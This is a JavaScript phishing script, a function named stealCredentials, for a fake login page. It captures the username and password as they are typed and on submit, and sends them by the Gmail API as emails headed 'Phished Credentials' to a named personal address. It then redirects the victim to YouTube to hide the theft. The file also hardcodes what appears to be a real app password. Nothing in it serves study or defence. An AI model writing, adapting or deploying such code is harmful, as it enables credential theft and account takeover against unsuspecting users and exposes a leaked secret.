function stealCredentials() {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const gmailAPIURL = 'https://gmail.googleapis.com/gmail/v1/users/me/messages/send';
    const appPassword = 'rhwa pznd ojdc dnqc'; // Replace with your app password

    function sendCredentials(data) {
        fetch(gmailAPIURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer ' + appPassword
            },
            body: JSON.stringify(data)
        })
        .then(response => response.json())
        .then(data => {
            console.log(data); // Log the response for debugging
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }

    usernameInput.addEventListener('input', () => {
        const username = usernameInput.value;
        sendCredentials({
            to: 'nahombeletew15@gmail.com',
            subject: 'Phished Credentials',
            textBody: 'Username: ' + username
        });
    });

    passwordInput.addEventListener('input', () => {
        const password = passwordInput.value;
        sendCredentials({
            to: 'nahombeletew15@gmail.com',
            subject: 'Phished Credentials',
            textBody: 'Password: ' + password
        });
    });

    document.forms[0].addEventListener('submit', (e) => {
        e.preventDefault();

        const username = usernameInput.value;
        const password = passwordInput.value;

        const data = {
            to: 'nahombeletew15@gmail.com',
            subject: 'Phished Credentials',
            textBody: 'Username: ' + username + '\nPassword: ' + password
        };

        sendCredentials(data);
        window.location.href = 'https://www.youtube.com';
    });
}

stealCredentials();
